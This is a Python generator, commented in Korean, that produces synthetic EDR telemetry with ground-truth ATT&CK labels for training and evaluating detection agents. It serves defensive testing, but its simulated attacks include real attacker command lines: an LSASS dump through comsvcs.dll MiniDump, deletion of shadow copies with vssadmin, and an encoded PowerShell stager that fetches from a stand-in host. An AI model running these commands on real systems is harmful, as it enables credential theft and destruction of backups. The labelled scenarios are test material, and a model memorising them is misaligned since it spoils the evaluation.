"""합성 EDR 텔레메트리 생성기 (실습용).

- 모든 데이터는 가상이며, 외부 IP는 문서용 예약 대역(198.51.100.0/24, 203.0.113.0/24)만 사용합니다.
- 공격 시나리오의 명령줄/스크립트는 '탐지 학습용 로그 모양'만 흉내 낸 것으로 실제 동작하는 코드가 아닙니다.
- 각 시나리오는 정답 라벨(GroundTruth: 악성 여부, ATT&CK 기법)을 함께 반환 → 에이전트 평가(agent_eval)에 사용.
"""
from __future__ import annotations

import base64
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from itertools import count

from ..schema import Event, FileInfo, NetworkInfo, ProcessInfo, RegistryInfo

HOSTS = [f"WS-{i:03d}" for i in range(1, 11)] + ["SRV-DB-01", "SRV-FILE-01"]
USERS = ["kim", "lee", "park", "choi", "jung", "kang", "cho", "yoon", "jang", "lim"]
INTERNAL = {"SRV-DB-01": "10.0.2.10", "SRV-FILE-01": "10.0.2.20"}
BENIGN_IPS = ["203.0.113.10", "203.0.113.11", "203.0.113.12", "203.0.113.40"]  # 사내 SaaS 등 (가상)
C2_IP = "198.51.100.23"

_ids = count(1)
_prefix = "evt"


def _eid() -> str:
    return f"{_prefix}-{next(_ids):08d}"


def reset_ids(start: int = 1, prefix: str = "evt") -> None:
    """데이터셋을 다시 만들 때 같은 id가 나오도록. 계속 도는 생성기는 prefix를 바꿔 id가 겹치지 않게 합니다."""
    global _ids, _prefix
    _ids = count(start)
    _prefix = prefix


@dataclass
class GroundTruth:
    scenario_id: str
    name: str
    host: str
    start: datetime
    end: datetime
    malicious: bool
    techniques: list[str]
    event_ids: list[str] = field(default_factory=list)


class _Builder:
    """한 호스트 위에서 프로세스 트리를 이어 붙이며 이벤트를 만드는 도우미."""

    def __init__(self, host: str, user: str, t0: datetime, rng: random.Random):
        self.host, self.user, self.t, self.rng = host, user, t0, rng
        self.events: list[Event] = []

    def tick(self, sec: float = 1.0) -> datetime:
        self.t += timedelta(seconds=sec)
        return self.t

    def proc(self, name, cmdline, parent: ProcessInfo | None, signed=True, sec=1.0) -> ProcessInfo:
        p = ProcessInfo(pid=self.rng.randint(1000, 65000), ppid=parent.pid if parent else 4, name=name,
                        cmdline=cmdline, parent_name=parent.name if parent else "System", signed=signed, user=self.user)
        self.events.append(Event(event_id=_eid(), ts=self.tick(sec), host=self.host, type="process", process=p))
        return p

    def net(self, p, ip, port, bytes_out=500, sec=1.0):
        self.events.append(Event(event_id=_eid(), ts=self.tick(sec), host=self.host, type="network", process=p,
                                 network=NetworkInfo(dst_ip=ip, dst_port=port, bytes_out=bytes_out)))

    def file(self, p, path, action, new_path=None, sec=1.0):
        self.events.append(Event(event_id=_eid(), ts=self.tick(sec), host=self.host, type="file", process=p,
                                 file=FileInfo(path=path, action=action, new_path=new_path)))

    def reg(self, p, key, value, sec=1.0):
        self.events.append(Event(event_id=_eid(), ts=self.tick(sec), host=self.host, type="registry", process=p,
                                 registry=RegistryInfo(key=key, value=value)))

    def script(self, p, text, sec=0.5):
        self.events.append(Event(event_id=_eid(), ts=self.tick(sec), host=self.host, type="script", process=p,
                                 script_text=text))


def _root(b: _Builder) -> ProcessInfo:
    return ProcessInfo(pid=b.rng.randint(1000, 9000), ppid=1, name="explorer.exe",
                       cmdline="C:\\Windows\\explorer.exe", parent_name="userinit.exe", user=b.user)


# ---------------------------------------------------------------- 정상 활동
def benign_burst(host: str, t0: datetime, rng: random.Random) -> list[Event]:
    b = _Builder(host, rng.choice(USERS), t0, rng)
    ex = _root(b)
    kind = rng.choice(["browser", "office", "dev", "mail", "update", "teams"])
    if kind == "browser":
        args = rng.choice(["", " --profile-directory=Default", f" --profile-directory=\"Profile {rng.randint(1, 4)}\"",
                           f" https://intranet.gureum.example/wiki/{rng.randint(100, 9999)}"])
        p = b.proc("chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"' + args, ex)
        for _ in range(rng.randint(1, 3)):
            b.net(p, rng.choice(BENIGN_IPS), 443, rng.randint(500, 50000), sec=rng.uniform(0.5, 5))
    elif kind == "office":
        doc = rng.choice(["report", "회의록", "budget_2026", "weekly", "proposal_v2"]) + f"_{rng.randint(1, 99)}.docx"
        p = b.proc("winword.exe", f'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\{b.user}\\Documents\\{doc}"', ex)
        b.file(p, f"C:\\Users\\{b.user}\\Documents\\{doc}", "modify", sec=rng.uniform(5, 30))
    elif kind == "dev":
        code = b.proc("code.exe", '"C:\\Users\\Public\\VSCode\\Code.exe"', ex)
        g = b.proc("git.exe", rng.choice(["git.exe pull origin main", "git.exe fetch --all --prune", f"git.exe checkout -b feature/{rng.randint(100, 999)}",
                                           "git.exe status", f"git.exe log -n {rng.randint(5, 50)} --oneline"]), code)
        b.net(g, "203.0.113.40", 443, rng.randint(1000, 20000))
        b.proc("python.exe", rng.choice(["python.exe -m pytest -q", f"python.exe scripts\\etl_{rng.randint(1, 9)}.py --date 2026-11-{rng.randint(1, 16):02d}",
                                         "python.exe -m pip list"]), code, sec=rng.uniform(2, 10))
    elif kind == "mail":
        p = b.proc("outlook.exe", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', ex)
        b.net(p, "203.0.113.11", 443, rng.randint(2000, 9000))
    elif kind == "update":
        svc = ProcessInfo(pid=rng.randint(500, 900), ppid=4, name="services.exe", cmdline="C:\\Windows\\system32\\services.exe", user="SYSTEM")
        b.user = "SYSTEM"
        p = b.proc("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wuauserv", svc)
        b.net(p, "203.0.113.12", 443, rng.randint(10000, 90000))
    else:
        p = b.proc("teams.exe", '"C:\\Users\\Public\\Teams\\ms-teams.exe"', ex)
        b.net(p, "203.0.113.10", 443, rng.randint(1000, 30000))
    return b.events


# ---------------------------------------------------------------- 오탐 유도용 정상 시나리오 (FP bait)
def it_inventory_script(host, t0, rng):
    """IT 자산관리 에이전트가 PowerShell을 Bypass로 실행 → 순진한 룰이면 오탐."""
    b = _Builder(host, "SYSTEM", t0, rng)
    ccm = ProcessInfo(pid=rng.randint(1000, 3000), ppid=600, name="ccmexec.exe", cmdline="C:\\Windows\\CCM\\CcmExec.exe", user="SYSTEM")
    ps = b.proc("powershell.exe", "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\IT\\inventory.ps1", ccm)
    b.script(ps, "# IT 자산 수집\nGet-CimInstance Win32_OperatingSystem | Select-Object Caption, Version\nGet-CimInstance Win32_Product | Select-Object Name, Version")
    b.net(ps, "203.0.113.40", 443, 4000)
    return b.events, GroundTruth("", "it_inventory_script", host, t0, b.t, False, [])


def backup_rename(host, t0, rng):
    """백업 소프트웨어가 파일을 대량으로 이름 변경 → 개수만 세는 랜섬웨어 룰이면 오탐."""
    b = _Builder(host, "SYSTEM", t0, rng)
    svc = ProcessInfo(pid=700, ppid=4, name="services.exe", cmdline="services.exe", user="SYSTEM")
    p = b.proc("backupagent.exe", '"C:\\Program Files\\BackupCo\\backupagent.exe" --rotate', svc)
    for i in range(30):
        b.file(p, f"D:\\backup\\daily_{i:02d}.bak", "rename", new_path=f"D:\\backup\\daily_{i:02d}.bak.old", sec=0.2)
    return b.events, GroundTruth("", "backup_rename", host, t0, b.t, False, [])


# ---------------------------------------------------------------- 공격 시나리오
def phishing_macro_powershell(host, t0, rng):
    b = _Builder(host, rng.choice(USERS), t0, rng)
    ex = _root(b)
    word = b.proc("winword.exe", f'"WINWORD.EXE" /n "C:\\Users\\{b.user}\\Downloads\\invoice_0412.docm"', ex)
    cmd = b.proc("cmd.exe", "cmd.exe /c powershell -nop -w hidden -enc ...", word, sec=3)
    payload = "# SIMULATED STAGER (실습용 가짜)\nInvoke-WebRequest -Uri http://198.51.100.23/stage.txt -OutFile $env:TEMP\\s.txt"
    enc = base64.b64encode(payload.encode("utf-16-le")).decode()
    ps = b.proc("powershell.exe", f"powershell.exe -nop -w hidden -enc {enc}", cmd)
    b.script(ps, payload)
    for _ in range(6):  # 일정 간격 비컨
        b.net(ps, C2_IP, 443, rng.randint(200, 400), sec=30)
    return b.events, GroundTruth("", "phishing_macro_powershell", host, t0, b.t, True,
                                 ["T1566.001", "T1204.002", "T1059.001", "T1071.001"])


def credential_dump(host, t0, rng):
    """01 문서의 예시 알림: rundll32가 comsvcs.dll MiniDump로 LSASS 메모리를 파일로 빼냄."""
    b = _Builder(host, rng.choice(USERS), t0, rng)
    ex = _root(b)
    cmd = b.proc("cmd.exe", "cmd.exe", ex)
    lsass_pid = 668
    dmp = "C:\\Windows\\Temp\\d.dmp"
    p = b.proc("rundll32.exe", f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {lsass_pid} {dmp} full", cmd)
    b.file(p, dmp, "create")
    return b.events, GroundTruth("", "credential_dump", host, t0, b.t, True, ["T1003.001"])


def persistence_runkey(host, t0, rng):
    b = _Builder(host, rng.choice(USERS), t0, rng)
    ex = _root(b)
    ps = b.proc("powershell.exe", "powershell.exe -nop -c Set-ItemProperty ...", ex)
    b.file(ps, "C:\\Users\\Public\\updater.exe", "create")
    b.reg(ps, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "C:\\Users\\Public\\updater.exe")
    upd = b.proc("updater.exe", "C:\\Users\\Public\\updater.exe", ex, signed=False, sec=60)
    b.net(upd, C2_IP, 8443, 300)
    return b.events, GroundTruth("", "persistence_runkey", host, t0, b.t, True, ["T1547.001", "T1071.001"])


def lateral_psexec(host, t0, rng):
    b = _Builder(host, rng.choice(USERS), t0, rng)
    ex = _root(b)
    cmd = b.proc("cmd.exe", "cmd.exe", ex)
    target = "SRV-DB-01"
    px = b.proc("psexec.exe", f"psexec.exe \\\\{target} -s cmd.exe", cmd, signed=True)
    b.net(px, INTERNAL[target], 445, 1500)
    events = b.events
    # 대상 서버 쪽 흔적
    s = _Builder(target, "SYSTEM", b.t, rng)
    svc = ProcessInfo(pid=640, ppid=4, name="services.exe", cmdline="services.exe", user="SYSTEM")
    psx = s.proc("psexesvc.exe", "C:\\Windows\\PSEXESVC.exe", svc)
    s.proc("cmd.exe", "cmd.exe", psx)
    return events + s.events, GroundTruth("", "lateral_psexec", host, t0, s.t, True, ["T1021.002", "T1569.002"])


def ransomware(host, t0, rng):
    b = _Builder(host, rng.choice(USERS), t0, rng)
    ex = _root(b)
    mal = b.proc("invoice_viewer.exe", f"C:\\Users\\{b.user}\\Downloads\\invoice_viewer.exe", ex, signed=False)
    b.proc("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", mal)
    for i in range(30):
        f = f"C:\\Users\\{b.user}\\Documents\\file_{i:02d}.docx"
        b.file(mal, f, "rename", new_path=f + ".locked", sec=0.3)
    b.file(mal, f"C:\\Users\\{b.user}\\Desktop\\README_RESTORE.txt", "create")
    return b.events, GroundTruth("", "ransomware", host, t0, b.t, True, ["T1486", "T1490"])


ATTACKS = [phishing_macro_powershell, credential_dump, persistence_runkey, lateral_psexec, ransomware]
FP_BAITS = [it_inventory_script, backup_rename]


def generate_dataset(seed: int = 42, minutes: int = 60, benign_per_min: int = 20,
                     attacks_per_kind: int = 2, fp_per_kind: int = 2,
                     start: datetime | None = None) -> tuple[list[Event], list[GroundTruth]]:
    """정해진 seed로 항상 같은 데이터셋을 생성 → 탐지/평가 결과를 재현 가능하게."""
    rng = random.Random(seed)
    reset_ids()
    t0 = start or datetime(2026, 11, 16, 9, 0, tzinfo=timezone.utc)
    events: list[Event] = []
    for m in range(minutes):
        for _ in range(benign_per_min):
            events += benign_burst(rng.choice(HOSTS[:10]), t0 + timedelta(minutes=m, seconds=rng.uniform(0, 59)), rng)
    truths: list[GroundTruth] = []
    kinds = [(f, attacks_per_kind) for f in ATTACKS] + [(f, fp_per_kind) for f in FP_BAITS]
    n = 0
    for fn, k in kinds:
        for _ in range(k):
            n += 1
            evs, gt = fn(rng.choice(HOSTS[:10]), t0 + timedelta(minutes=rng.uniform(1, minutes - 5)), rng)
            gt.scenario_id = f"sc-{n:03d}"
            gt.event_ids = [e.event_id for e in evs]
            events += evs
            truths.append(gt)
    events.sort(key=lambda e: e.ts)
    return events, truths
